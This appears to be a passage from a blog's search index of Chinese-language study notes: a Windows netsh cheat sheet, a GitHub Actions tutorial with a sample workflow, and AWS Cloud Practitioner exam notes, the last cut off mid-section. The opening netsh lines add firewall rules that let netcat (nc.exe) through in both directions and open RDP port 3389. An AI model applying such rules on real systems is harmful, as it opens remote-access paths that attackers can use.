&quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure></li><li>Windows Server 2003之後的版本  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure></li><li>允許指定程式退出  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure></li><li>允許3389 Port通行  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure></li></ul></li><li>自訂防火牆紀錄檔的儲存位置<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 指令/工具用法整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> PowerShell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>📑Github Action 學習筆記</title>
      <link href="/posts/24be9e02.html"/>
      <url>/posts/24be9e02.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/zn0lCzN.png"></p><p>我以前其實沒有CI&#x2F;CD的經驗，所以現有常見的CI&#x2F;CD平台其實都沒有太過了解，但近期因專案需求，需要透過Github Action　來建立一個用於Azure認知服務中的<strong>斷句API (BreakSentence API)</strong> 的CI&#x2F;CD Pipeline，在被交付的需求還很模糊的狀況下😭，還是先來了解這項功能，並且做個紀錄。</p><h2 id="基本介紹"><a href="#基本介紹" class="headerlink" title="基本介紹"></a>基本介紹</h2><p>是一個CI&#x2F;CD平台，能夠自動化建置(Build)、測試(Test)以及部署(Deployment)，使用者可以建立工作流程(Workflow)來建置以及測試每個對Repository的pull請求或者是將合併的pull請求部署到生產環境。</p><h2 id="Components"><a href="#Components" class="headerlink" title="Components"></a>Components</h2><p>構成Github Actions中的元件名詞如下</p><ul><li>Workflow</li><li>Event</li><li>Jobs</li><li>Runner</li><li>Steps</li><li>Action</li></ul><p>先講這些元件的合作起來的行為會是怎麼樣: 當Repository中發生某個 <strong>事件(Event)<strong>，此時你所設定的 Github Actions <strong>Workflows</strong> 被觸發。這裡的事件，舉例來說可以是</strong>一個pull request請求</strong>或是<strong>某個issued被建立</strong> 等等。</p><p><img src="https://i.imgur.com/SuvKp3J.png" alt="&#39;Github Action workflows&#39;"></p><p>你所定義的Workflow當中包含了一個或多個 <strong>Jobs</strong> ，這些Jobs可以是被<strong>平行處理(Parallel)</strong> 或是 <strong>依序處理(Sequential)</strong> ，每個Jobs會在自己的虛擬機Runner被處理，或者是在容器內運行。而每個Jobs中有包含了一個或多個 <strong>Steps</strong> ，會執行你定義的腳本或是某個 <strong>Action</strong>，Action是Github Action當中的最小單位，是一個可重複使用的擴展，通常是某些通用指令(?😥)</p><h2 id="🔀Workflows"><a href="#🔀Workflows" class="headerlink" title="🔀Workflows"></a>🔀Workflows</h2><ul><li>一個可設定來自動化流程的一個或多個Jobs被稱作為Workflow，可以透過撰寫YAML檔來定義Workflow,並在Event發生時被觸發，也可以手動觸發。</li><li>Workflow被定義在Repo中的 <code>.github/workflows</code> 路徑底下</li><li>一個Repo可以有多個Workflows，並負責執行各種不同的任務<ul><li>像是，一個用於Build跟Test的Workflow</li><li>另一個則是在Release發布後部署應用到生產環境的Workflow</li></ul></li></ul><h2 id="✴️Events"><a href="#✴️Events" class="headerlink" title="✴️Events"></a>✴️Events</h2><p>Event代表在Repository中的特定行為，像是:</p><ul><li>pull request</li><li>open issues</li><li>psuhes a commit to repo …etc</li></ul><p>用於觸發Workflows的Event可以參考這份文件<br><a href="https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows">https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows</a></p><h2 id="🗂️Jobs"><a href="#🗂️Jobs" class="headerlink" title="🗂️Jobs"></a>🗂️Jobs</h2><p>一組Steps被稱作Job,並且執行在Runner上，每個Steps可能會是一個Shell Script或是Action被執行。Steps會依序執行，且由於每個Steps是在相同的Runner上被執行，因此可以在不同Steps之間共享相同資料。 舉例： 一個step建置完應用後另一個step來測試應用。</p><p>你也可以設定Jobs的依賴項，一旦一個Jobs依賴另一個Job，則會等待另一個Job完成後才開始執行自己的任務。<br><a href="https://docs.github.com/en/actions/using-jobs">https://docs.github.com/en/actions/using-jobs</a></p><h2 id="📑Actions"><a href="#📑Actions" class="headerlink" title="📑Actions"></a>📑Actions</h2><p>Action是一個專為Github Action平台設計的程序，可執行複雜、高頻率且重複的工作。<br>透過Action可以減少出現在workflow檔案中大量重複的程式碼。<br>一個Action可以做到像是從Github當中拉取repository，並為所建置的環境設定正確的工具集，並設定好與你的雲端供應用商之間的身分驗證。</p><p>設定Action:<a href="https://docs.github.com/en/actions/creating-actions">https://docs.github.com/en/actions/creating-actions</a></p><h2 id="📦Runners"><a href="#📦Runners" class="headerlink" title="📦Runners"></a>📦Runners</h2><p>用於運行workflow的Server，每個Runner一次只會執行一個Job。<br>Github提供 Ubuntu、Windows以及MacOS Runner來執行Workflow。<br>也會大型Runner需求者提供解決方案:<a href="https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners">https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners</a><br>若所需執行環境需要不同的OS或特規硬體設定，使用者也可以host自己的Runner <a href="https://docs.github.com/en/actions/hosting-your-own-runners">https://docs.github.com/en/actions/hosting-your-own-runners</a></p><h2 id="建立-Workflow"><a href="#建立-Workflow" class="headerlink" title="建立 Workflow"></a>建立 Workflow</h2><p>Github Action 使用YAML來建立Workflow。每個 Workflow 都以獨立的YAML檔儲存，並且放置在 <code>.github/workflows</code> 路徑底下</p><h2 id="建立範例-Workflows"><a href="#建立範例-Workflows" class="headerlink" title="建立範例 Workflows"></a>建立範例 Workflows</h2><ul><li>建立路徑:  <code>.gituhb/workflows</code></li><li>在 <code>.github/workflows</code> 當中建立 <code>learn-github-action.yml</code><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">learn-github-actions</span></span><br><span class="line"><span class="attr">run-name:</span> <span class="string">$&#123;&#123;</span> <span class="string">github.actor</span> <span class="string">&#125;&#125;</span> <span class="string">is</span> <span class="string">learning</span> <span class="string">GitHub</span> <span class="string">Actions</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>]</span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">check-bats-version:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&#x27;14&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">bats</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">bats</span> <span class="string">-v</span></span><br></pre></td></tr></table></figure></li><li>commit 這次的更動，並 push 到 repository</li></ul><h2 id="Workflows-File-逐行解釋"><a href="#Workflows-File-逐行解釋" class="headerlink" title="Workflows File 逐行解釋"></a>Workflows File 逐行解釋</h2><p>參考: <a href="https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore">Workflow Syntax</a></p><ul><li><code>name</code> : 指定Workflow名稱，並會出現在Repository中的Action Tab</li><li><code>run-name</code> : 每次運行該Workflow時會出現的文字訊息，這邊指定 repo username + “is learning Github Actions”</li></ul><p><img src="https://i.imgur.com/B5l23tf.png"></p><ul><li><code>on</code> : 指定會觸發 Workflows 的行為，這裡使用 <code>push</code> event，所以依但有人 push更動到 repository，則會觸發 Workflows的執行</li><li><code>jobs</code> : 將 Workflows當中的job組合在一起</li><li><code>check-bats-version</code> : 自定義Job的名稱</li><li><code>runs-on</code>: 設定Job執行在OS為最新版本的Ubuntu Linux的Runner上，此指定會觸發Hosted所託管的虛擬機被建立。</li><li><code>steps</code>: 將 <code>check-bats-version</code> job 底下的所有step組合再一起</li><li><code>uses</code>:　用來指定step的命令或行為<ul><li><code>actions/checkout@v3</code>: 代表要執行v3版本的actions&#x2F;checkout行為，<strong>此步驟會將你的repo checkout到Runner上，並允許你針對你的程式進行操作，每當你的Workflow將針對Repository的程式運行時，都應該使用 checkout 操作</strong></li><li><code>actions/setup-node@v3</code>: 此步驟會安裝指定版本的NodeJS(此範例中視版本1)</li></ul></li><li><code>run</code> : run指令會告訴 job在Runner中執行特定指令，此範例終究是告訴Job在Runner中執行 npm install bats，以及下一步則是去查看 bats版本</li></ul><h2 id="尋找以及自定義-Actions"><a href="#尋找以及自定義-Actions" class="headerlink" title="尋找以及自定義 Actions"></a>尋找以及自定義 Actions</h2><p>一個Action可以被定義在:</p><ul><li>與你Workflow檔案相同的Repository當中</li><li>所有公開的Repository</li><li>DockerHub中的已發布的容器image當中</li></ul><h3 id="Github-Action-Martketplace"><a href="#Github-Action-Martketplace" class="headerlink" title="Github Action Martketplace"></a>Github Action Martketplace</h3><p><a href="https://github.com/marketplace?type=actions">Marketplace連結</a></p><p><img src="https://i.imgur.com/oFXdxsj.png"></p><p>在Marketplace 當中有許多其他貢獻者所提供的Action，可以下載</p><p><img src="https://i.imgur.com/TFdKxou.png"></p><p>每個Action當中會有提供相應的YAML Synatx可以複製並貼上至自己的Workflow檔案當中，若Action需要你提供Input，則需要額外設定Workflow，可參考這份文件<br>，<a href="https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions#using-inputs-and-outputs-with-an-action">https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions#using-inputs-and-outputs-with-an-action</a></p><h3 id="在相同Repository底下添加-Action"><a href="#在相同Repository底下添加-Action" class="headerlink" title="在相同Repository底下添加 Action"></a>在相同Repository底下添加 Action</h3><p><em>範例檔案結構</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">|-- hello-world (repository)</span><br><span class="line">|   |__ .github</span><br><span class="line">|       └── workflows</span><br><span class="line">|           └── my-first-workflow.yml</span><br><span class="line">|       └── actions</span><br><span class="line">|           |__ hello-world-action</span><br><span class="line">|               └── action.yml</span><br></pre></td></tr></table></figure><p><em>範例 Workflow 檔</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jobs:</span><br><span class="line">  build:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    steps:</span><br><span class="line">      # This step checks out a copy of your repository.</span><br><span class="line">      - uses: actions/checkout@v3</span><br><span class="line">      # This step references the directory that contains the action.</span><br><span class="line">      - uses: ./.github/actions/hello-world-action</span><br></pre></td></tr></table></figure><p>synatx: <code>./path/to/dir</code></p><p>而 action.yml 是為了Action提供Metadata用的。</p><h3 id="從不同-Repository-加入-Action"><a href="#從不同-Repository-加入-Action" class="headerlink" title="從不同 Repository 加入 Action"></a>從不同 Repository 加入 Action</h3><p>這時在你的workflow檔當中的 use 底下就需要指定 <code>&#123;owner&#125;/&#123;repo&#125;@&#123;ref&#125;</code> 來標明 reference action的repo，範例:  <code>actions/setup-node@v3</code></p><h3 id="引用-DockerHub上的容器"><a href="#引用-DockerHub上的容器" class="headerlink" title="引用 DockerHub上的容器"></a>引用 DockerHub上的容器</h3><p>此時 syntax需要改成: <code>docker://&#123;image&#125;:&#123;tag&#125;</code></p><h2 id="實作-Azure-Break-Sentence-CI-x2F-CD-Pipeline"><a href="#實作-Azure-Break-Sentence-CI-x2F-CD-Pipeline" class="headerlink" title="實作: Azure Break Sentence CI&#x2F;CD Pipeline"></a>實作: Azure Break Sentence CI&#x2F;CD Pipeline</h2><p><em>整體架構圖</em><br><img src="https://i.imgur.com/OvSfq3m.png"></p><h3 id="Event需求"><a href="#Event需求" class="headerlink" title="Event需求"></a>Event需求</h3><h3 id="Runner-環境套件設定"><a href="#Runner-環境套件設定" class="headerlink" title="Runner 環境套件設定"></a>Runner 環境套件設定</h3><ul><li>OS: Ubuntu Linux</li><li>Python 3.8.10</li><li>Environment Variables<ul><li>AZURE_API_KEY</li><li>AZURE_LOCATION</li></ul></li></ul><blockquote><p>感覺可以自定義Actions</p></blockquote><h3 id="Break-Sentence"><a href="#Break-Sentence" class="headerlink" title="Break Sentence"></a>Break Sentence</h3><p><img src="https://i.imgur.com/kd6kJ2X.png"></p><p>🧪目標: <strong>在使用者上傳檔案時，就能夠擷取裡面的文章，去呼叫BreakSentence.py 進行斷句，再保存到特定Ouput Folder</strong></p><h3 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h3><ul><li><input checked="" disabled="" type="checkbox"> Azure API Key 被Disable  -&gt; 變更信箱重新註冊或付費續訂</li><li><input checked="" disabled="" type="checkbox"> 測試 YML檔透過環境變數方式來存取Secrets</li><li><input checked="" disabled="" type="checkbox"> 變更Repository中所存放的Secrets值</li><li><input checked="" disabled="" type="checkbox"> <code>BreakSentence.py</code> -&gt; 需加上讀檔功能<ul><li><input disabled="" type="checkbox"> 可能要可以開文字檔以及Excel檔</li></ul></li><li><input checked="" disabled="" type="checkbox"> <code>BreakSentence.py</code> -&gt; 要包裝成指令工具</li></ul><p><img src="https://i.imgur.com/xnAfxMl.png"><br><del>目前在Setup Python就會出錯</del> ✅已解決</p><p><img src="https://i.imgur.com/Sz9BA33.png"><br><del>沒有指定 Module，需用pip 指令安裝特定模組</del> ✅已解決</p><p><img src="https://i.imgur.com/McSwZ3L.png"><br><del>無法存取Secret中的值作為環境變數</del> ✅已解決<br>需要將env 區段放到run breaksentence.py的區段底下<br><img src="https://i.imgur.com/tlKx4k7.png"></p><p><img src="https://i.imgur.com/2AFUYyK.png"><br>執行成功 </p><p><img src="https://i.imgur.com/ortWe1v.png"></p><p>目前腳本中只有把api call的reponse印出來以及切句子存在List<br>下一步驟就是改變輸入輸出方式</p><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p>[1]<a href="https://ithelp.ithome.com.tw/articles/10266827">https://ithelp.ithome.com.tw/articles/10266827</a><br>[2]<a href="https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions">https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions</a><br>[3]<a href="https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions">https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions</a><br>[4] <a href="https://ithelp.ithome.com.tw/articles/10266828">Github Action Push到Azure雲端</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CI/CD </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🔋 AWS Certified Cloud Practitioner 證照準備筆記</title>
      <link href="/posts/e8acb5ee.html"/>
      <url>/posts/e8acb5ee.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/x1Sq6so.png"></p><h1 id="CCP-準備"><a href="#CCP-準備" class="headerlink" title="CCP 準備"></a>CCP 準備</h1><ul><li><p><strong>考試指南</strong>: <a href="https://d1.awsstatic.com/zh_TW/training-and-certification/docs-cloud-practitioner/AWS-Certified-Cloud-Practitioner_Exam-Guide.pdf">https://d1.awsstatic.com/zh_TW/training-and-certification/docs-cloud-practitioner/AWS-Certified-Cloud-Practitioner_Exam-Guide.pdf</a></p></li><li><p><strong>考試題型占比</strong><br><img src="https://i.imgur.com/xv5xcGu.png"></p></li><li><p><strong>相關資源</strong></p><ul><li><a href="https://terahake.in/post/aws-ccp-certified-exp/">https://terahake.in/post/aws-ccp-certified-exp/</a></li><li><a href="https://awslc.medium.com/aws-cloud-practitioner%E8%AD%89%E7%85%A7%E6%BA%96%E5%82%99-6b8bacc6a490">https://awslc.medium.com/aws-cloud-practitioner%E8%AD%89%E7%85%A7%E6%BA%96%E5%82%99-6b8bacc6a490</a></li><li><a href="https://jayendrapatil.com/aws-certified-cloud-practitioner-exam-learning-path/?fbclid=IwAR3eiyroyZ_jTn2pA5ut_ophP8JNCzgspERnug_luC_HGltA-OkLwRwrhAU">https://jayendrapatil.com/aws-certified-cloud-practitioner-exam-learning-path/?fbclid=IwAR3eiyroyZ_jTn2pA5ut_ophP8JNCzgspERnug_luC_HGltA-OkLwRwrhAU</a></li><li><a href="https://d1.awsstatic.com/whitepapers/AWS_Cloud_Best_Practices.pdf?fbclid=IwAR1xXOBkWwESyy_9Srngna7rAbP_g1ddYMl2KO3moKJbzz1YDgrNOrv_z08">https://d1.awsstatic.com/whitepapers/AWS_Cloud_Best_Practices.pdf?fbclid=IwAR1xXOBkWwESyy_9Srngna7rAbP_g1ddYMl2KO3moKJbzz1YDgrNOrv_z08</a></li><li><a href="https://d0.awsstatic.com/whitepapers/aws_pricing_overview.pdf?fbclid=IwAR2mDUgA-IDHrqrQFGn3XL1kA0O1XojD6d6rdxwLWmvuL4D4mi4DKeDNonQ">https://d0.awsstatic.com/whitepapers/aws_pricing_overview.pdf?fbclid=IwAR2mDUgA-IDHrqrQFGn3XL1kA0O1XojD6d6rdxwLWmvuL4D4mi4DKeDNonQ</a></li><li><a href="http://yhhuang1966.blogspot.com/2020/03/aws-aws-certified-cloud-practitioner.html">http://yhhuang1966.blogspot.com/2020/03/aws-aws-certified-cloud-practitioner.html</a></li></ul></li><li><p><strong>模擬考體</strong></p><ul><li><a href="https://www.examtopics.com/exams/amazon/aws-certified-cloud-practitioner/">https://www.examtopics.com/exams/amazon/aws-certified-cloud-practitioner/</a></li></ul></li></ul><h2 id="Well-Architect五大支柱"><a href="#Well-Architect五大支柱" class="headerlink" title="Well-Architect五大支柱"></a>Well-Architect五大支柱</h2><ul><li>卓越營運<ul><li>能夠執行和監控系統以實現商業價值，並持續提升支援流程和程序的能力。</li></ul></li><li>安全性<ul><li>是保護資訊、系統和資產，同時透過風險評估和緩解策略來實現商業價值的能力</li></ul></li><li>可靠性<ul><li>從基礎設施或服務中斷中恢復</li><li>動態取得運算資源以滿足需求</li><li>減少配置不當或暫時性網路問題等中斷情況</li></ul></li><li>效能達成效率<ul><li>用運算資源以符合系統需求，並在需求變化和技術升級時維持效率的能力</li></ul></li><li>成本最佳化<ul><li>是能以最低價格點執行系統來提供商業價值的能力。</li></ul></li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="Amazon-Athena"><a href="#Amazon-Athena" class="headerlink" title="Amazon Athena"></a>Amazon Athena</h3><ul><li>透過標準SQL互動式Query來在S3當中分析資料</li><li>無伺服器</li><li>可定義Schema並藉由SQL來在S3當中分析資料</li></ul><h3 id="Amazon-Kinesis"><a href="#Amazon-Kinesis" class="headerlink" title="Amazon Kinesis"></a>Amazon Kinesis</h3><ul><li>可以輕鬆地蒐集、處例並分析即時串流資料</li><li>像是影音串流、應用程式日誌、網頁點擊分析、IoT遙測資料等等<ul><li>Amazon Kinesis Data Firhose</li><li>Amazon Kinesis Data Analytics</li><li>Amazon Kinesis Data Streams</li><li>Amazon Kinesis Video Streams</li></ul></li></ul><h3 id="Amazon-QuickSight"><a href="#Amazon-QuickSight" class="headerlink" title="Amazon QuickSight"></a>Amazon QuickSight</h3><ul><li>強大的BI(Business intelligent)服務</li><li>可建立互動式dashboard</li></ul><h2 id="應用程式整合"><a href="#應用程式整合" class="headerlink" title="應用程式整合"></a>應用程式整合</h2><h3 id="Amazon-Simple-Notification-Service-Amazon-SNS"><a href="#Amazon-Simple-Notification-Service-Amazon-SNS" class="headerlink" title="Amazon Simple Notification Service (Amazon SNS)"></a>Amazon Simple Notification Service (Amazon SNS)</h3><ul><li>一種發布&#x2F;訂閱服務。如使用 Amazon SNS 主題，發布者可將訊息發布給訂閱者。這種方式如同在咖啡店裡，收銀員向製作飲料的咖啡師提供咖啡訂單一樣。</li><li>在 Amazon SNS 中，訂閱者可能是 Web 伺服器、電子郵件地址、AWS Lambda 函數或其他幾種選項</li></ul><h3 id="Amazon-Simple-Queue-Service-Amazon-SQS"><a href="#Amazon-Simple-Queue-Service-Amazon-SQS" class="headerlink" title="Amazon Simple Queue Service (Amazon SQS)"></a>Amazon Simple Queue Service (Amazon SQS)</h3><ul><li>Amazon Simple Queue Service (Amazon SQS) 是一種訊息佇列服務</li><li>在 Amazon SQS 中，應用程式會將訊息傳送到佇列中。使用者或服務會從佇列擷取訊息，加以處理後，從佇列中刪除訊息</li><li></li></ul><h2 id="運算和無伺服器"><a href="#運算和無伺服器" class="headerlink" title="運算和無伺服器"></a>運算和無伺服器</h2><h3 id="AWS-Batch"><a href="#AWS-Batch" class="headerlink" title="AWS Batch"></a>AWS Batch</h3><h3 id="Amazon-EC2"><a href="#Amazon-EC2" class="headerlink" title="Amazon EC2"></a>Amazon EC2</h3><ul><li>執行個體類型<ul><li>一般用途<ul><li>應用程式中的運算、記憶體和網路功能資源需求大致相同</li></ul></li><li>運算最佳化<ul><li>需要運算密集型的應用</li><li>需要處理單一群組中有多筆交易的批次處理工作負載時，您也可以使用運算最佳化執行個體</li></ul></li><li>記憶體最佳化<ul><li>在於為記憶體內處理大型資料集的工作負載提供快速效能。在運算中，記憶體是暫時儲存區。它會保留中央處理單元（CPU）完成動作所需的所有資料和指令。</li><li>工作負載需要在執行應用程式之前預先載入大量資料。此種情況可能是高效能資料庫，或者需要執行大量非結構化資料即時處理的工作負載</li></ul></li><li>加速運算最佳化<ul><li>使用硬體加速器或協同處理器來提高執行某些功能的效率，其效果更勝在 CPU 上執行軟體的可行效率</li><li>使用硬體加速器或協同處理器來提高執行某些功能的效率，其效果更勝在 CPU 上執行軟體的可行效率</li></ul></li><li>儲存最佳化<ul><li>專為需要對本機儲存體上的超大型資料集進行高序列讀取及寫入存取工作負載所設計。適合儲存最佳化執行個體的工作負載包括分散式檔案系統、資料倉儲應用程式，以及高頻線上交易處理 (OLTP) 系統</li><li>為應用程式提供每秒數萬次低延遲的隨機 I&#x2F;O 操作 (IOPS) 而設計</li><li>應用程式具有高 IOPS 需求</li></ul></li></ul></li><li>EC2 定價<ul><li>隨需(On-Demand)<ul><li>適用不可中斷短期的工作負載</li><li>無須合約</li></ul></li><li>Saving Plan<ul><li>承諾一年或三年內維持一定的運算量</li><li>比隨需便宜</li></ul></li><li>預留執行個體<ul><li>可購買一年或三年期的執行個體</li><li>用量可以根據帳戶中的隨需執行個體而定</li></ul></li><li>Spot執行個體<ul><li>適合可以承受中斷的應用</li><li>像是批次任務</li></ul></li><li>專用主機<ul><li>實體EC2伺服器</li></ul></li></ul></li></ul><h3 id="AWS-Elastic-Beanstalk"><a href="#AWS-Elastic-Beanstalk" class="headerlink" title="AWS Elastic Beanstalk"></a>AWS Elastic Beanstalk</h3><ul><li>在您提供程式碼和組態設定後，Elastic Beanstalk 會負責部署執行下列任務所需的資源<ul><li>調整容量</li><li>負載平衡</li><li>自動擴展</li><li>應用程式運作狀態監控</li></ul></li></ul><h3 id="AWS-Lambda"><a href="#AWS-Lambda" class="headerlink" title="AWS Lambda"></a>AWS Lambda</h3><p><img src="https://i.imgur.com/iOCFQm5.png"></p><h3 id="Amazon-Lightsail"><a href="#Amazon-Lightsail" class="headerlink" title="Amazon Lightsail"></a>Amazon Lightsail</h3><ul><li>Amazon Lightsail 以經濟高效的每月價格，提供易於使用的虛擬私有伺服器 (VPS) 執行個體、容器、儲存、資料庫等。</li></ul><h3 id="Amazon-WorkSpaces"><a href="#Amazon-WorkSpaces" class="headerlink" title="Amazon WorkSpaces"></a>Amazon WorkSpaces</h3><ul><li>Amazon WorkSpaces 是一種用於 Windows 和 Linux 的全受管桌面虛擬化服務，可讓您從任何支援的裝置存取資源。</li></ul><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="Amazon-Elastic-Container-Service-Amazon-ECS"><a href="#Amazon-Elastic-Container-Service-Amazon-ECS" class="headerlink" title="Amazon Elastic Container Service (Amazon ECS)"></a>Amazon Elastic Container Service (Amazon ECS)</h3><ul><li>是可高度擴展的高效能容器管理系統，可讓您在 AWS 上輕鬆執行及擴展容器化應用程式</li><li>支援Docker</li></ul><h3 id="Amazon-Elastic-Kubernetes-Service-Amazon-EKS"><a href="#Amazon-Elastic-Kubernetes-Service-Amazon-EKS" class="headerlink" title="Amazon Elastic Kubernetes Service (Amazon EKS)"></a>Amazon Elastic Kubernetes Service (Amazon EKS)</h3><ul><li>透過它即可在 AWS 上執行 Kubernetes</li><li></li></ul><h3 id="AWS-Fargate"><a href="#AWS-Fargate" class="headerlink" title="AWS Fargate"></a>AWS Fargate</h3><ul><li>容器專用的無伺服器運算引擎，Amazon ECS 和 Amazon EKS 都適用。</li></ul><h2 id="資料庫"><a href="#資料庫" class="headerlink" title="資料庫"></a>資料庫</h2><h3 id="Amazon-Aurora"><a href="#Amazon-Aurora" class="headerlink" title="Amazon Aurora"></a>Amazon Aurora</h3><ul><li>企業級關聯式資料庫，比標準MySQL快5倍，比標準PostgreSQL快3倍</li><li>支援兩種資料庫選項: MySQL, PostgreSQL</li><li>成本極低</li><li>資料會被複寫到各項設施(隨時會有六份副本，最高可達15個讀取副本)</li><li>持續備份到Amazon S3</li><li>Point-in Time復原</li></ul><h3 id="Amazon-DynamoDB"><a href="#Amazon-DynamoDB" class="headerlink" title="Amazon DynamoDB"></a>Amazon DynamoDB</h3><ul><li>無伺服器資料庫，無須管理基礎執行個體或基礎設施</li><li>建立<strong>表格</strong>，以存放或查看資料</li><li>資料會被劃分成項目(Item)，項目具有屬性(Attribute)</li><li>屬性代表資料中的不同功能</li><li>會在多個可用區域當中儲存硬碟鏡像，提高可用性</li><li>高效能且可大規模擴展，回應時間為毫秒級</li><li>屬於NoSQL 資料庫</li><li>無法透過SQL進行查詢，可根據KEY屬性來進行查詢，靈活性高</li><li>使用案例: Amazon Prime Day應付大量使用者訂單請球</li></ul><h3 id="Amazon-ElastiCache"><a href="#Amazon-ElastiCache" class="headerlink" title="Amazon ElastiCache"></a>Amazon ElastiCache</h3><ul><li>為資料庫提供快取層，增加資料庫讀寫速度<ul><li>Memcached</li><li>Redis</li></ul></li></ul><h3 id="Amazon-DAX-DynamoDB-Accelerator"><a href="#Amazon-DAX-DynamoDB-Accelerator" class="headerlink" title="Amazon DAX(DynamoDB Accelerator)"></a>Amazon DAX(DynamoDB Accelerator)</h3><ul><li>為DynamoDB提供原生快速層，改善NoSQL資料讀取時間</li></ul><h3 id="Amazon-Relational-Database-Service-RDS"><a href="#Amazon-Relational-Database-Service-RDS" class="headerlink" title="Amazon Relational Database Service(RDS)"></a>Amazon Relational Database Service(RDS)</h3><ul><li>為<code>關聯式資料庫管理服務</code> (資料會已與其他資料建立關聯的方式來儲存)</li><li><h2 id="支援大多資料庫引擎-Amazon-Aurora-MySQL-PostgreSQL-MaraDB-Oracle-Micorsoft-SQL-Server"><a href="#支援大多資料庫引擎-Amazon-Aurora-MySQL-PostgreSQL-MaraDB-Oracle-Micorsoft-SQL-Server" class="headerlink" title="支援大多資料庫引擎  - Amazon Aurora  - MySQL  - PostgreSQL  - MaraDB  - Oracle  - Micorsoft SQL Server"></a>支援大多資料庫引擎<br>  - Amazon Aurora<br>  - MySQL<br>  - PostgreSQL<br>  - MaraDB<br>  - Oracle<br>  - Micorsoft SQL Server</h2></li><li>優點<ul><li>自動修補漏洞</li><li>備份</li><li>冗餘</li><li>容錯移轉</li><li>災難復原</li></ul></li><li>可進一步將它們部署至Amazon Aurora</li></ul><h3 id="Amazon-Redshift"><a href="#Amazon-Redshift" class="headerlink" title="Amazon Redshift"></a>Amazon Redshift</h3><ul><li>專為高速、即時擷取和查詢的資料庫，用於資料分析工作</li><li>大多關聯式資料庫容量有一定限制，因此不適合用於歷史資料分析</li><li>且資料種類繁雜，一班關聯式資料庫難易應付，因此這時需要<strong>資料倉儲(Data Warehouse)</strong></li><li>資料倉儲負責處理大數據，適用於歷史分析而不是營運分析</li><li>例如，一小時前我們的販售量如何，這種數字已經不會再變動了</li><li>而一般營運分析則是，我們現在的咖啡庫存如何，這種隨時在變動的資料</li><li>Redshift 可以實現傳統資料庫的10倍效能</li></ul><h3 id="AWS-Database-Migration-Service-Amazon-DMS"><a href="#AWS-Database-Migration-Service-Amazon-DMS" class="headerlink" title="AWS Database Migration Service(Amazon DMS)"></a>AWS Database Migration Service(Amazon 